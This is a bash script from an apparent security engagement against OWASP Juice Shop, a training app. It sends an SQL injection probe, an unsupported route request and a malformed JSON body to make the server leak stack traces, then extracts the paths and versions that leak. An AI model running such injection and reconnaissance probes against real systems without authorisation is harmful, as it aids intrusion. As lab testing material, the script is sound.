#!/usr/bin/env bash
# Engagement: c06-error-disclosure
# Target : OWASP Juice Shop v20.3.0 @ http://host.docker.internal:3000
# Goal   : Make the app disclose internal error/stack-trace detail to an unauthenticated user.
#
# Finding: The global Express error handler renders raw exception messages plus a full
#          server-side stack trace (absolute filesystem paths, module versions) to the client.
#          Multiple unauthenticated, unsanitized inputs reach it.

TARGET="${TARGET:-http://host.docker.internal:3000}"
OUT="/workspace/evidence/c6_error.txt"

hdr() { printf '\n\n========== %s ==========\n' "$*"; }

{
  echo "ERROR / STACK-TRACE DISCLOSURE (CWE-209) - OWASP Juice Shop v20.3.0"
  echo "Target: $TARGET"
  echo "Date  : $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo "Auth  : none (unauthenticated requests)"

  # ---------------------------------------------------------------- Case 1
  hdr "CASE 1: SQL error disclosure via product search (SQLi probe)"
  echo "Request: GET /rest/products/search?q=%27%29%29%20UNION%20SELECT"
  echo "Cause  : q parameter is concatenated into a raw SQLite string with no error handling,"
  echo "         so the DB engine's own error text is returned to the client."
  echo "--- response (status + body) ---"
  curl -s -o /tmp/c1.html -w 'HTTP %{http_code}\n' \
       --get "$TARGET/rest/products/search" --data-urlencode "q=')) UNION SELECT"
  sed -e 's/<[^>]*>//g' /tmp/c1.html | grep -v '^[[:space:]]*$' | head -20

  # ---------------------------------------------------------------- Case 2
  hdr "CASE 2: Full server stack trace via unsupported route path"
  echo "Request: GET /api/version"
  echo "Cause  : Angular fallback route throws 'Unexpected path' with no NODE_ENV=production"
  echo "         stack suppression; full /juice-shop/... stack is rendered to the client."
  echo "--- response (status + body) ---"
  curl -s -o /tmp/c2.html -w 'HTTP %{http_code}\n' "$TARGET/api/version"
  sed -e 's/<[^>]*>//g' /tmp/c2.html | grep -v '^[[:space:]]*$' | head -40

  # ---------------------------------------------------------------- Case 3
  hdr "CASE 3: Parser/internal exception disclosure via malformed JSON body"
  echo "Request: POST /api/Users  Content-Type: application/json  body='{bad json'"
  echo "Cause  : body-parser JSON SyntaxError is forwarded to the same verbose error handler."
  echo "--- response (status + body) ---"
  curl -s -o /tmp/c3.html -w 'HTTP %{http_code}\n' -X POST "$TARGET/api/Users" \
       -H 'Content-Type: application/json' --data-binary '{bad json'
  sed -e 's/<[^>]*>//g' /tmp/c3.html | grep -v '^[[:space:]]*$' | head -40

  # ------------------------------------------------- Extracted intelligence
  hdr "INTELLIGENCE LEAKED"
  echo "- Framework: $(sed -e 's/<[^>]*>//g' /tmp/c2.html | grep -m1 -o 'Express [0-9.^]*')"
  echo "- Absolute server path root : /juice-shop/"
  sed -e 's/<[^>]*>//g' /tmp/c2.html \
    | grep -o '/juice-shop/[a-zA-Z0-9_./-]*\.js:[0-9]*:[0-9]*' | sort -u \
    | sed 's/^/    source: /'
  echo "- Leaked internal modules: routes/angular.js, routes/verify.js, lib/utils.js, lib/insecurity.js,"
  echo "  node_modules/express/lib/router/*"
  echo "- DB engine + raw driver error surfaced: SQLITE_ERROR"
} > "$OUT" 2>&1

echo "[+] Evidence written to $OUT"
wc -l "$OUT"
